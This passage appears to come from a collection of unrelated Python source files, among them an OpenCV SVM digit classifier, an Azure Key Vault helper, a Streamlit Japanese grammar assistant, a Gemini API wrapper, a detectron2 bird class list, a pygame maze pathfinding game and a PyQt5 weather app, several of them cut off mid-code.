'./Model/4/*'\n    LOAD_TRAIN_IMG5S_PATH = './Model/5/*'\n    LOAD_TRAIN_IMG6S_PATH = './Model/6/*'\n    LOAD_TRAIN_IMG7S_PATH = './Model/7/*'\n    LOAD_TRAIN_IMG8S_PATH = './Model/8/*'\n    LOAD_TRAIN_IMG9S_PATH = './Model/9/*'\n\n    # \u4f5c\u6210\u3057\u305f\u5b66\u7fd2\u30e2\u30c7\u30eb\u306e\u4fdd\u5b58\u5148\n    SAVE_TRAINED_DATA_PATH = './Model/svm_trained_data.xml'\n    \n    # \u691c\u8a3c\u7528\u306e\u753b\u50cf\u30d5\u30a1\u30a4\u30eb\u306e\u683c\u7d0d\u5148\uff08\u5206\u5272\u5f8cIGT\u30b9\u30af\u30ea\u30fc\u30f3\u30b7\u30e7\u30c3\u30c8\uff09\n    LOAD_TEST_IMGS_PATH = './Data/*'\n\n    # \u5b66\u7fd2\u7528\u306e\u753b\u50cf\u30d5\u30a1\u30a4\u30eb\u306e\u30d1\u30b9\u3092\u53d6\u5f97\n    load_img0_paths = glob.glob(LOAD_TRAIN_IMG0S_PATH)\n    load_img1_paths = glob.glob(LOAD_TRAIN_IMG1S_PATH)\n    load_img2_paths = glob.glob(LOAD_TRAIN_IMG2S_PATH)\n    load_img3_paths = glob.glob(LOAD_TRAIN_IMG3S_PATH)\n    load_img4_paths = glob.glob(LOAD_TRAIN_IMG4S_PATH)\n    load_img5_paths = glob.glob(LOAD_TRAIN_IMG5S_PATH)\n    load_img6_paths = glob.glob(LOAD_TRAIN_IMG6S_PATH)\n    load_img7_paths = glob.glob(LOAD_TRAIN_IMG7S_PATH)\n    load_img8_paths = glob.glob(LOAD_TRAIN_IMG8S_PATH)\n    load_img9_paths = glob.glob(LOAD_TRAIN_IMG9S_PATH)\n\n    # \u5b66\u7fd2\u7528\u306e\u753b\u50cf\u30d5\u30a1\u30a4\u30eb\u3092\u30ed\u30fc\u30c9\n    imgs0 = create_images_array(load_img0_paths)\n    imgs1 = create_images_array(load_img1_paths)\n    imgs2 = create_images_array(load_img2_paths)\n    imgs3 = create_images_array(load_img3_paths)\n    imgs4 = create_images_array(load_img4_paths)\n    imgs5 = create_images_array(load_img5_paths)\n    imgs6 = create_images_array(load_img6_paths)\n    imgs7 = create_images_array(load_img7_paths)\n    imgs8 = create_images_array(load_img8_paths)\n    imgs9 = create_images_array(load_img9_paths)\n    imgs = np.r_[imgs0, imgs1, imgs2, imgs3, imgs4, imgs5, imgs6, imgs7, imgs8, imgs9]\n\n    # \u6b63\u89e3\u30e9\u30d9\u30eb\u3092\u751f\u6210\n    labels0 = np.full(len(load_img0_paths), 0, np.int32)\n    labels1 = np.full(len(load_img1_paths), 1, np.int32)\n    labels2 = np.full(len(load_img2_paths), 2, np.int32)\n    labels3 = np.full(len(load_img3_paths), 3, np.int32)\n    labels4 = np.full(len(load_img4_paths), 4, np.int32)\n    labels5 = np.full(len(load_img5_paths), 5, np.int32)\n    labels6 = np.full(len(load_img6_paths), 6, np.int32)\n    labels7 = np.full(len(load_img7_paths), 7, np.int32)\n    labels8 = np.full(len(load_img8_paths), 8, np.int32)\n    labels9 = np.full(len(load_img9_paths), 9, np.int32)\n    labels = np.array([np.r_[labels0, labels1, labels2, labels3, labels4, labels5, labels6, labels7, labels8, labels9]])\n\n    # SVM\u3067\u5b66\u7fd2\u30e2\u30c7\u30eb\u306e\u4f5c\u6210\uff08\u30ab\u30fc\u30cd\u30eb:LINEAR \u7dda\u5f62, gamma:1, C:1\uff09\n    svm = cv2.ml.SVM_create()\n    svm.setType(cv2.ml.SVM_C_SVC)\n    svm.setKernel(cv2.ml.SVM_LINEAR)\n    svm.setGamma(1)\n    svm.setC(1)\n    svm.setTermCriteria((cv2.TERM_CRITERIA_COUNT, 100, 1.e-06))\n    svm.train(imgs, cv2.ml.ROW_SAMPLE, labels)\n\n    # \u5b66\u7fd2\u7d50\u679c\u3092\u4fdd\u5b58\n    svm.save(SAVE_TRAINED_DATA_PATH)\n\n    # \u5206\u5272\u5f8cIGT\u30b9\u30af\u30ea\u30fc\u30f3\u30b7\u30e7\u30c3\u30c8\u3092\u5165\u529b\u3057\u3001\u753b\u50cf\u306b\u66f8\u304b\u308c\u305f\u6570\u5b57\u3092\u4e88\u6e2c\n    test_img_paths = glob.glob(LOAD_TEST_IMGS_PATH)\n    test_imgs_temp = create_images_array(test_img_paths)\n    test_imgs = np.r_[test_imgs_temp]\n    svm = cv2.ml.SVM_load(SAVE_TRAINED_DATA_PATH)\n    predicted = svm.predict(test_imgs)\n\n    # \u4e88\u6e2c\u7d50\u679c\u3092\u8868\u793a\n    #print(\"predicted:\", predicted[1].T)\n\n    # float\u578b\u3067\u7d50\u679c\u304c\u51fa\u308b\u306e\u3067\u3001\u6587\u5b57\u5217\u306b\u5909\u63db\u3057\u3066\u7d50\u5408\n    predicted_join = \"\"\n    for i in range(6):\n        predicted_join += str(",
    "from azure.identity import DefaultAzureCredential\nfrom azure.keyvault.secrets import SecretClient\nimport os\nfrom typing import List\n\n\ndef get_secret(secret_name: str) -> str:\n    \"\"\"\n    Retrieves the value of a secret from Azure Key Vault.\n\n    This function requires an environment variable `KEY_VAULT_NAME` to be set, which is the name of the Key Vault\n    from which to fetch the secret.\n    For local development, this can be set in `local.settings.json`.\n    For production use Settings/Configuration in Function App.\n\n    Args:\n        secret_name (str): The name of the secret to retrieve.\n\n    Returns:\n        str: The value of the retrieved secret.\n    \"\"\"\n\n    key_vault_name = os.environ[\"KEY_VAULT_NAME\"]\n    key_vault_uri = f\"https://{key_vault_name}.vault.azure.net/\"\n\n    # Authenticate using the default Azure credential method.\n    credential = DefaultAzureCredential()\n    client = SecretClient(vault_url=key_vault_uri, credential=credential)\n\n    retrieved_secret = client.get_secret(secret_name)\n\n    return retrieved_secret.value\n\n\ndef get_sources_content(docs: List[dict]) -> (List[str], List[dict]): # type: ignore\n    \"\"\"\n    Formats a list of document dictionaries into a list of strings containing the content\n    and a list of dictionaries for citations containing 'title' and 'url'.\n\n    Each document dictionary should have 'url', 'title', 'content', and optionally 'sections'.\n    Sections should be a list of dictionaries with a 'text' field.\n\n    Args:\n        docs (List[dict]): A list of document dictionaries to format.\n\n    Returns:\n        Tuple[List[str], List[dict]]: A tuple containing a list of formatted strings \n        containing the content from the input documents, and a list of dictionaries \n        for citations.\n    \"\"\"\n\n    formatted_docs = []\n    citations = []\n    for doc in docs:\n        title = doc.get('title', 'Unknown Title')\n        url = doc.get('url', '#')\n        \n        content_parts = [nonewlines(doc.get('content', ''))]\n        content_parts += [section['text'] for section in doc.get('sections', []) if section['text']]\n        \n        # Concatenate all parts, separated by periods.\n        content = \" . \".join(content_parts)\n        \n        formatted_content = f\"{content} (Source: {title})\"\n        \n        formatted_docs.append(formatted_content)\n        \n        citations.append({'url': url, 'title': title})\n\n    return formatted_docs, citations\n\n\ndef nonewlines(text: str) -> str:\n    \"\"\"\n    Removes all newline characters from a string, replacing them with spaces.\n\n    Args:\n        text (str): The input string from which to remove newline characters.\n\n    Returns:\n        str: The modified string with newline characters replaced by spaces.\n    \"\"\"\n    return ' '.join(text.split())\n\n\ndef isEnglish(language: str) -> bool:\n    return language == 'en'\n",
    "from pathlib import Path\n\nimport setuptools\n\nVERSION = \"0.1.9\"\n\nNAME = \"aegypti\"\n\nINSTALL_REQUIRES = [\n    \"numpy>=2.2.1\",\n    \"scipy>=1.15.0\",  \n]\n\nsetuptools.setup(\n    name=NAME,\n    version=VERSION,\n    description=\"Solve the Triangle-Free Problem for an undirected graph represented by a Boolean Adjacency Matrix given in a File.\",\n    url=\"https://github.com/frankvegadelgado/finlay\",\n    project_urls={\n        \"Source Code\": \"https://github.com/frankvegadelgado/finlay\",\n        \"Documentation Research\": \"https://www.researchgate.net/publication/387698746_The_Triangle_Finding_Problem\",\n    },\n    author=\"Frank Vega\",\n    author_email=\"vega.frank@gmail.com\",\n    license=\"MIT License\",\n    classifiers=[\n        \"Topic :: Scientific/Engineering\",\n        \"Topic :: Software Development\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python :: 3.12\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Education\",\n        \"Intended Audience :: Information Technology\",\n        \"Intended Audience :: Science/Research\",\n        \"Natural Language :: English\",\n    ],\n    python_requires=\">=3.12\",\n    # Requirements\n    install_requires=INSTALL_REQUIRES,\n    packages=[\"aegypti\"],\n    long_description=Path(\"README.md\").read_text(),\n    long_description_content_type=\"text/markdown\",\n    entry_points={\n        'console_scripts': [\n            'triangle = aegypti.app:main',\n            'test_triangle = aegypti.test:main'\n        ]\n    }\n)",
    "\"\"\"\nJapanese Grammar Assistant Streamlit Application\n\nThis application provides a chat interface for Japanese language learning,\nintegrating Bunpro grammar data with LLM-powered responses.\n\"\"\"\n\nimport streamlit as st\nfrom llm import LLMConfig, LLMClient\nimport json\nfrom bunpro import BunproClient\nfrom typing import Dict, List, Union, Optional, Any\nfrom pydantic import BaseModel, Field, SecretStr\nimport os\nfrom groq import Groq  # Add this import for type hints\nimport time\n\n\nclass ChatMessage(BaseModel):\n    \"\"\"Pydantic model for chat messages\"\"\"\n    role: str = Field(..., description=\"Role of the message sender (user/assistant/system)\")\n    content: str = Field(..., description=\"Content of the message\")\n\n\nclass AppState(BaseModel):\n    \"\"\"Pydantic model for application state\"\"\"\n    bunpro_credentials_set: bool = Field(default=False, description=\"Whether Bunpro credentials are set\")\n    bunpro_data_loaded: bool = Field(default=False, description=\"Whether Bunpro data is loaded\")\n    messages: List[ChatMessage] = Field(default_factory=list, description=\"Chat message history\")\n    bunpro_email: Optional[str] = Field(None, description=\"Bunpro account email\")\n    bunpro_password: Optional[str] = Field(None, description=\"Bunpro account password\")\n\n\n# Set page config FIRST - before any other Streamlit commands\nst.set_page_config(\n    page_title=\"Japanese Grammar Assistant\",\n    page_icon=\"\ud83c\udf8c\",\n    layout=\"wide\",\n)\n\n\ndef decode_unicode(text: Union[str, Dict, List]) -> Union[str, Dict, List]:\n    \"\"\"\n    Decode Unicode escape sequences in text.\n\n    Args:\n        text: Input text, dictionary, or list containing text to decode\n\n    Returns:\n        Decoded text in the same structure as input\n    \"\"\"\n    if isinstance(text, str):\n        return text.encode('utf-8').decode('unicode-escape').encode('latin1').decode('utf-8')\n    elif isinstance(text, dict):\n        return {k: decode_unicode(v) for k, v in text.items()}\n    elif isinstance(text, list):\n        return [decode_unicode(item) for item in text]\n    return text\n\n\ndef load_bunpro_data() -> Optional[Dict]:\n    \"\"\"\n    Load Bunpro grammar data from JSON file.\n\n    Returns:\n        Optional[Dict]: Dictionary containing grammar data or None if file not found\n    \"\"\"\n    try:\n        with open('bunpro_data.json', 'r', encoding='utf-8') as f:\n            return json.load(f)\n    except FileNotFoundError:\n        return None\n\n\ndef initialize_session_state() -> None:\n    \"\"\"Initialize Streamlit session state with default values\"\"\"\n    # Initialize session states using Pydantic model defaults\n    default_state = AppState()\n\n    if 'bunpro_credentials_set' not in st.session_state:\n        st.session_state.bunpro_credentials_set = default_state.bunpro_credentials_set\n\n    if 'bunpro_data_loaded' not in st.session_state:\n        st.session_state.bunpro_data_loaded = default_state.bunpro_data_loaded\n\n    if \"messages\" not in st.session_state:\n        st.session_state.messages = default_state.messages\n\n    # Initialize LLM config with defaults if not set\n    if 'llm_config' not in st.session_state:\n        st.session_state.llm_config = {\n            'provider': 'groq',\n            'model_name': \"llama-3.3-70b-versatile\",\n            'temperature': 0.7,\n            'max_tokens': 2048\n        }\n\n\ndef setup_sidebar() -> None:\n    \"\"\"Setup and handle sidebar UI elements\"\"\"\n    with st.sidebar:\n        st.title('\ud83e\udd16\ud83d\udcac Japanese Grammar Assistant / \u65e5\u672c\u8a9e\u6587\u6cd5\u30a2\u30b7\u30b9\u30bf\u30f3\u30c8')\n\n        # LLM Settings section (always visible)\n        with st.expander(\"\ud83d\udd27 LLM Settings\", expanded=True):\n            # Provider selection\n            provider = st.selectbox(\n                \"Provider\",\n                options=[\"groq\", \"openai\", \"anthropic\"],\n                index=0,\n                help=\"Select your LLM provider\"\n            )\n\n            # Show warning for non-Groq providers\n            if provider != \"groq\":\n                st.warning(f\"\u26a0\ufe0f {provider.title()} integration is coming soon! Please use Groq for now.\")\n\n            # Model selection based on provider\n            if provider == \"groq\":\n                model_options = [\n                    \"llama-3.3-70b-versatile\",\n                    \"mixtral-8x7b-32768\"\n                ]\n            else:\n                model_options = [\"Coming soon...\"]\n\n            model = st.selectbox(\n                \"Model\",\n                options=model_options,\n                index=0,\n                help=\"Select the model to use\"\n            )\n\n            # Temperature slider\n            temperature = st.slider(\n                \"Temperature\",\n                min_value=0.0,\n                max_value=1.0,\n                value=st.session_state.llm_config.get('temperature', 0.7),\n                step=0.1,\n                help=\"Higher values make output more creative, lower values more deterministic\"\n            )\n\n            # Max tokens slider\n            max_tokens = st.slider(\n                \"Max Tokens\",\n                min_value=256,\n                max_value=4096,",
    "import os\nimport google.generativeai as genai\n\n\nclass ModelWrapper:\n    def __init__(self, api_key):\n        self.api_key = api_key\n        self.system_instruction = \"\"\"\n        Return some tasks and skills based on this given data when the user asks about any related questions. Otherwise, reply false.\n        \n        Return in JSON format:\n        {\n            \"skills\": [],\n            \"tasks\": [\n                {\n                    \"skill\": []\n                }\n            ]\n        }\n        \n        Only use the data mentioned below:\n        - Data Science: [Machine Learning, Data Visualization, Data Cleaning]\n        - Web Development: [Frontend Development, Backend Development, Database Management]\n        - Artificial Intelligence: [Natural Language Processing, Deep Learning, Computer Vision]\n        \n        Tasks:\n        - Machine Learning: [Build a predictive model, Train a classification model, Evaluate model accuracy]\n        - Data Visualization: [Create a dashboard, Generate charts, Visualize data trends]\n        \"\"\"\n\n    def genmini_generate(self, prompt, model_name=\"gemini-1.5-pro\"):\n        try:\n            # Configure the API\n            genai.configure(api_key=self.api_key)\n\n            generation_config = {\n            \"temperature\": 0.7,\n            \"top_p\": 0.95,\n            \"top_k\": 40,\n            \"max_output_tokens\": 8192,\n            \"response_mime_type\": \"text/plain\",\n            }\n            \n            # Generate the response\n            model = genai.GenerativeModel(\n            model_name=model_name,\n            generation_config=generation_config,\n            system_instruction=self.system_instruction,\n            )\n            chat_session = model.start_chat(\n            history=[]\n        )\n            response = chat_session.send_message(prompt)\n            return response.text\n        \n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n\n\n# Securely fetch the API key from environment variables\nif __name__ == \"__main__\":\n    api_key = \"\"\n    print(api_key)\n\n    # Initialize the model wrapper\n    gemini = ModelWrapper(api_key)\n\n    # Call the method and print the output\n    response = gemini.genmini_generate(\"What are the skills needed for Data Science?\")\n    print(response)\n",
    "import os\n\nfrom detectron2.data import DatasetCatalog, MetadataCatalog\nfrom detectron2.data.datasets import load_sem_seg\nfrom detectron2.utils.colormap import colormap\n\nCLASSES = ['background',\n           'Black-footed Albatross',\n           'Laysan Albatross',\n           'Sooty Albatross',\n           'Groove billed Ani',\n           'Crested Auklet',\n           'Least Auklet',\n           'Parakeet Auklet',\n           'Rhinoceros Auklet',\n           'Brewer Blackbird',\n           'Red winged Blackbird',\n           'Rusty Blackbird',\n           'Yellow-headed Blackbird',\n           'Bobolink',\n           'Indigo Bunting',\n           'Lazuli Bunting',\n           'Painted Bunting',\n           'Cardinal',\n           'Spotted Catbird',\n           'Gray Catbird',\n           'Yellow-breasted Chat',\n           'Eastern Towhee',\n           'Chuck will Widow',\n           'Brandt Cormorant',\n           'Red-faced Cormorant',\n           'Pelagic Cormorant',\n           'Bronzed Cowbird',\n           'Shiny Cowbird',\n           'Brown Creeper',\n           'American Crow',\n           'Fish Crow',\n           'Black-billed Cuckoo',\n           'Mangrove Cuckoo',\n           'Yellow-billed Cuckoo',\n           'Gray-crowned Rosy-Finch',\n           'Purple Finch',\n           'Northern Flicker',\n           'Acadian Flycatcher',\n           'Great Crested Flycatcher',\n           'Least Flycatcher',\n           'Olive-sided Flycatcher',\n           'Scissor-tailed Flycatcher',\n           'Vermilion Flycatcher',\n           'Yellow-bellied Flycatcher',\n           'Frigatebird',\n           'Northern Fulmar',\n           'Gadwall',\n           'American Goldfinch',\n           'European Goldfinch',\n           'Boat-tailed Grackle',\n           'Eared Grebe',\n           'Horned Grebe',\n           'Pied-billed Grebe',\n           'Western Grebe',\n           'Blue Grosbeak',\n           'Evening Grosbeak',\n           'Pine Grosbeak',\n           'Rose-breasted Grosbeak',\n           'Pigeon Guillemot',\n           'California Gull',\n           'Glaucous-winged Gull',\n           'Heermann Gull',\n           'Herring Gull',\n           'Ivory Gull',\n           'Ring-billed Gull',\n           'Slaty-backed Gull',\n           'Western Gull',\n           'Anna Hummingbird',\n           'Ruby-throated Hummingbird',\n           'Rufous Hummingbird',\n           'Green Violetear',\n           'Long-tailed Jaeger',\n           'Pomarine Jaeger',\n           'Blue Jay',\n           'Florida Jay',\n           'Green Jay',\n           'Dark-eyed Junco',\n           'Tropical Kingbird',\n           'Gray Kingbird',\n           'Belted Kingfisher',\n           'Green Kingfisher',\n           'Pied Kingfisher',\n           'Ringed Kingfisher',\n           'White-breasted Kingfisher',\n           'Red-legged Kittiwake',\n           'Horned Lark',\n           'Pacific Loon',\n           'Mallard',\n           'Western Meadowlark',\n           'Hooded Merganser',\n           'Red-breasted Merganser',\n           'Mockingbird',\n           'Nighthawk',\n           'Clark Nutcracker',\n           'White-breasted Nuthatch',\n           'Baltimore Oriole',\n           'Hooded Oriole',\n           'Orchard Oriole',\n           'Scott Oriole',\n           'Ovenbird',\n           'Brown Pelican',\n           'White Pelican',\n           'Western Wood-Pewee',\n           'Sayornis',\n           'American Pipit',\n           'Whip-poor-Will',\n           'Horned Puffin',\n           'Common Raven',\n           'White-necked Raven',\n           'American Redstart',\n           'Geococcyx',\n           'Loggerhead Shrike',\n           'Great Grey Shrike',\n           'Baird Sparrow',\n           'Black-throated Sparrow',\n           'Brewer Sparrow',\n           'Chipping Sparrow',\n           'Clay-colored Sparrow',\n           'House Sparrow',\n           'Field Sparrow',\n           'Fox Sparrow',\n           'Grasshopper Sparrow',\n           'Harris Sparrow',\n           'Henslow Sparrow',\n           'Le Conte Sparrow',\n           'Lincoln Sparrow',\n           'Nelson Sharp-tailed Sparrow',\n           'Savannah Sparrow',\n           'Seaside Sparrow',\n           'Song Sparrow',\n           'Tree Sparrow',\n           'Vesper Sparrow',\n           'White-crowned Sparrow',\n           'White-throated Sparrow',\n           'Cape Glossy Starling',\n           'Bank Swallow',\n           'Barn Swallow',\n           'Cliff Swallow',\n           'Tree Swallow',\n           'Scarlet Tanager',\n           'Summer Tanager',\n           'Artic Tern',\n           'Black Tern',\n           'Caspian Tern',\n           'Common Tern',\n           'Elegant Tern',\n           'Forsters Tern',\n           'Least Tern',\n           'Green-tailed Towhee',\n           'Brown Thrasher',\n           'Sage Thrasher',\n           'Black-capped Vireo',\n           'Blue-headed Vireo',\n           'Philadelphia Vireo',\n           'Red-eyed Vireo',\n           'Warbling Vireo',\n           'White-eyed Vireo',\n           'Yellow-throated Vireo',\n           'Bay-breasted Warbler',\n           ",
    "import pygame\nimport random\nimport time\nimport heapq\n\nWIDTH, HEIGHT = 885, 885\nROWS, COLS = 49, 49\nCELL_SIZE = WIDTH // COLS\nPANEL_WIDTH = 300\n\n\n# M\u00e0u s\u1eafc\nWHITE = (255, 255, 255)\nBLACK = (0, 0, 0)\nRED = (255, 0, 0)\nGREEN = (0, 255, 0)\nBLUE = (0, 0, 255)\nGRAY = (200, 200, 200)\nDARK_GRAY = (150, 150, 150)\n\n\n# Kh\u1edfi t\u1ea1o Pygame\npygame.init()\nscreen = pygame.display.set_mode((WIDTH + PANEL_WIDTH, HEIGHT))\npygame.display.set_caption(\"TR\u00d2 CH\u01a0I \\\"T\u00ccM \u0110\u01af\u1edcNG V\u1ec0 NH\u00c0\\\"\")\nclock = pygame.time.Clock()\n\n\n# T\u1ea3i h\u00ecnh \u1ea3nh\nassets = {\n    \"floor\": pygame.transform.scale(pygame.image.load(\"floor.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"wall\": pygame.transform.scale(pygame.image.load(\"wall.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"door\": pygame.transform.scale(pygame.image.load(\"DoorWin.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"footprint\": pygame.transform.scale(pygame.image.load(\"footprint.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"knight_up\": pygame.transform.scale(pygame.image.load(\"kup.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"knight_down\": pygame.transform.scale(pygame.image.load(\"kdown.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"knight_left\": pygame.transform.scale(pygame.image.load(\"kleft.png\"), (CELL_SIZE, CELL_SIZE)),\n    \"knight_right\": pygame.transform.scale(pygame.image.load(\"kright.png\"), (CELL_SIZE, CELL_SIZE)),\n}\n\n\n# T\u1ea1o l\u01b0\u1edbi v\u00e0 g\u00e1n c\u00e1c gi\u00e1 tr\u1ecb ban \u0111\u1ea7u\ngrid = [[0 for _ in range(COLS)] for _ in range(ROWS)]\nstart = (0, 0)\ngoal = (ROWS - 1, COLS - 1)\ngrid[start[0]][start[1]] = 2  # \u0110i\u1ec3m b\u1eaft \u0111\u1ea7u\ngrid[goal[0]][goal[1]] = 3    # \u0110i\u1ec3m \u0111\u00edch\ncurrent_position = start      # V\u1ecb tr\u00ed hi\u1ec7n t\u1ea1i\ncurrent_direction = \"down\"    # H\u01b0\u1edbng m\u1eb7c \u0111\u1ecbnh\nbanPhim = False\nfootprint_positions = []\nstart_time = None\n\n\n# N\u00fat trong panel\nbuttons = {\n    \"TAO_ME_CUNG\": pygame.Rect(WIDTH + 20, 50, PANEL_WIDTH - 40, 50),\n    \"XOA_ME_CUNG\": pygame.Rect(WIDTH + 20, 120, PANEL_WIDTH - 40, 50),\n    \"BAT_DAU_TIM_DUONG\": pygame.Rect(WIDTH + 20, 190, PANEL_WIDTH - 40, 50),\n}\n\n\n# Radio button\nradio_buttons = {\n    \"DFS\": pygame.Rect(WIDTH + 20, 300, 20, 20),\n    \"BFS\": pygame.Rect(WIDTH + 20, 330, 20, 20),\n    \"A*\": pygame.Rect(WIDTH + 20, 360, 20, 20),\n    \"LEO_DOI\": pygame.Rect(WIDTH + 20, 390, 20, 20),\n    \"TU_DI_CHUYEN\": pygame.Rect(WIDTH + 20, 420, 20, 20),\n}\nThuatToan = \"DFS\"\n\n# S\u1eed d\u1ee5ng ng\u0103n x\u1ebfp \u0111\u1ec3 x\u00e2y d\u1ef1ng thu\u1eadt to\u00e1n BFS\nclass Queue:\n    def __init__(self):\n        self.items = []\n\n    def enqueue(self, item):\n        self.items.append(item)\n\n    def dequeue(self):\n        if self.is_empty():\n            raise IndexError(\"Hang doi rong !!!.\")\n        return self.items.pop(0)\n    \n    def is_empty(self):\n        return len(self.items) == 0\n\n\n# S\u1eed d\u1ee5ng ng\u0103n x\u1ebfp \u0111\u1ec3 x\u00e2y d\u1ef1ng thu\u1eadt to\u00e1n DFS\nclass Stack:\n    def __init__(self):\n        self.items = []\n\n    def push(self, item):\n        self.items.append(item)\n\n    def pop(self):\n        if self.is_empty():\n            raise IndexError(\"Stack rong !!!\")\n        return self.items.pop()\n\n    def is_empty(self):\n        return len(self.items) == 0\n\n    def size(self):\n        return len(self.items)\n\n\n# H\u00e0m x\u00e2y d\u1ef1ng \u0111\u01b0\u1eddng \u0111i t\u00ecm th\u1ea5y\ndef TruyVet(parent, goal, start):\n    path = []\n    current = goal\n    while current in parent:\n        path.append(current)\n        current = parent[current]\n    path.reverse()\n    return path if current == start else []   \n\n\n# Thu\u1eadt to\u00e1n BFS\ndef BFS(grid, start, goal, speed):\n    queue = Queue()\n    queue.enqueue(start)\n    visited = set()\n    parent = {}\n    visited.add(start)\n    \n    while queue:\n        current = queue.dequeue()\n\n        if current != start and current != goal:\n            HightLightTrangThai(current)\n            pygame.display.update()\n            time.sleep(speed)\n\n        if current == goal:\n            return TruyVet(parent, goal, start)\n\n        x, y = current\n        for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:\n            nx, ny = x + dx, y + dy\n            neighbor = (nx, ny)\n            if (0 <= nx < ROWS and 0 <= ny < COLS and (nx, ny) not in visited and grid[nx][ny] != 1):\n                queue.enqueue(neighbor)\n                visited.add(neighbor)\n                parent[neighbor] = current\n    return []\n\n# Thu\u1eadt to\u00e1n DFS\ndef DFS(grid, start, goal, speed):\n    stack = Stack()\n    stack.push(start)\n    visited = set()\n    parent = {}\n\n    while not stack.is_empty():\n        current = stack.pop()\n\n        # Highlight \u00f4 hi\u1ec7n t\u1ea1i (tr\u1eeb \u0111i\u1ec3m b\u1eaft \u0111\u1ea7u v\u00e0 \u0111\u00edch)\n        if current != start and current != goal:\n            HightLightTrangThai(current)\n            pygame.display.update()\n            time.sleep(speed)\n\n        if current == goal:\n            return TruyVet(parent, goal, start)\n\n        visited.add(current)\n        x, y = current\n\n        # Duy\u1ec7t c\u00e1c \u00f4 l\u00e2n c\u1eadn\n        for dx, dy in [(-1, 0), (1, 0), (0, -1), (0, 1)]:\n            nx, ny = x + dx, y + dy\n            neighbor = (nx, ny)\n            if (0 <= nx < ROWS and 0 <= ny < COLS and neighbor not in visited and grid[nx][ny] != 1):\n                stack.push(neighbor)\n                parent[neighbor] = current\n    return ",
    "import pygame\r\n\r\nclass Slider:\r\n    def __init__(self,ui,pdim,pval,pval_min,pval_max,psnap_to_int,pupdate_live,pupdate_function):\r\n        self.dim = pdim  # Dim is a list of 5 parameters: x, y, width, height, draggable_width\r\n        self.val = pval\r\n        self.val_min = pval_min\r\n        self.val_max = pval_max\r\n        self.tval = self.val\r\n        self.snap_to_int = psnap_to_int\r\n        self.update_live = pupdate_live\r\n        self.update_function = pupdate_function\r\n        ui.sliderList.append(self)\r\n        \r\n    def drawSlider(self, screen):\r\n        x, y, w, h, dw = self.dim\r\n        ratio = (self.tval-self.val_min)/self.getLength()\r\n        sliderSurface = pygame.Surface((w,h), pygame.SRCALPHA, 32)\r\n        sliderSurface.fill((80,80,80)) \r\n        pygame.draw.rect(sliderSurface,(230,230,230),(ratio*(w-dw),0,dw,h))\r\n        screen.blit(sliderSurface,(x,y))\r\n        \r\n    def getLength(self):\r\n        return max(self.val_max-self.val_min, 1)\r\n        \r\n    def updateVal(self):\r\n        if self.tval != self.val:\r\n            self.val = self.tval\r\n            self.update_function(self.val)\r\n            \r\n    def manualUpdate(self, val):\r\n        self.tval = val\r\n        self.updateVal()\r\n        self.update_function(self.val)",
    "import sys\r\nimport requests\r\nimport geocoder\r\nfrom PyQt5.QtWidgets import (QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout, QMessageBox)\r\nfrom PyQt5.QtCore import Qt\r\nfrom cred import api_key #You may need to get your own API KEY from https://openweathermap.org/weather-conditions\r\n\r\n\r\nclass WeatherApp(QWidget):\r\n    def __init__(self):\r\n        super().__init__()\r\n        self.city_label = QLabel(\"Today's Temps\", self)\r\n        self.city_input = QLineEdit(self)\r\n        self.get_weather_button = QPushButton(\"Search City\", self)\r\n        self.my_location = QPushButton(\"\ud83e\udded Use Current Location\", self) # My Location Button\r\n        self.temperature_label = QLabel(self)\r\n        self.emoji_label = QLabel(self)\r\n        self.description_label = QLabel(self)\r\n        self.inputUI()\r\n\r\n    def inputUI(self):\r\n        self.setWindowTitle(f\"Today's Temps\")\r\n        vbox = QVBoxLayout()\r\n\r\n        vbox.addWidget(self.city_label)\r\n        vbox.addWidget(self.city_input)\r\n        vbox.addWidget(self.my_location) # My Location Button\r\n        vbox.addWidget(self.get_weather_button)\r\n        vbox.addWidget(self.temperature_label)\r\n        vbox.addWidget(self.emoji_label)\r\n        vbox.addWidget(self.description_label)\r\n\r\n        self.setLayout(vbox)\r\n\r\n        self.city_label.setAlignment(Qt.AlignCenter)\r\n        self.city_input.setAlignment(Qt.AlignCenter)\r\n        self.temperature_label.setAlignment(Qt.AlignCenter)\r\n        self.emoji_label.setAlignment(Qt.AlignCenter)\r\n        self.description_label.setAlignment(Qt.AlignCenter)\r\n\r\n        self.city_label.setObjectName(\"city_label\")\r\n        self.city_input.setObjectName(\"city_input\")\r\n        self.my_location.setObjectName(\"my_location\")\r\n        self.get_weather_button.setObjectName(\"get_weather_button\")\r\n        self.temperature_label.setObjectName(\"temperature_label\")\r\n        self.emoji_label.setObjectName(\"emoji_label\")\r\n        self.description_label.setObjectName(\"description_label\")\r\n\r\n        self.setStyleSheet(\"\"\"\r\n            QLabel, QPushButton{\r\n                           font-family: Ageo Trial;\r\n                           }\r\n                           \r\n                           QLabel#city_label{\r\n                            font-size: 40px;\r\n                            font-family: Ageo Trial Heavy;\r\n                           }\r\n                           \r\n                           QLineEdit#city_input{\r\n                            font-size: 38px;    \r\n                           }\r\n                           \r\n                           QPushButton#my_location{\r\n                            background-color: #ced1d7;\r\n                            font-size: 15px;\r\n                           }\r\n                           \r\n                           QPushButton#get_weather_button{\r\n                            font-size: 25px;\r\n                            background-color: #a9b5bd;\r\n                           }\r\n                          \r\n                            QLabel#temperature_label{\r\n                            font-size: 75px;\r\n                            font-family: Poppins Black;\r\n\r\n                           }\r\n                           QLabel#emoji_label{\r\n                            font-size: 120px;\r\n                            font-family: Segoe UI Emoji;\r\n                            }\r\n                           \r\n                           QLabel#description_label{\r\n                            font-size: 22px;\r\n                            font-family: Ageo Trial Thin;\r\n\r\n                           }\r\n        \"\"\")\r\n\r\n        self.get_weather_button.clicked.connect(self.get_weather)    \r\n        self.my_location.clicked.connect(self.get_weather_location) \r\n\r\n\r\n    def get_weather(self):\r\n        city = self.city_input.text()\r\n        url = 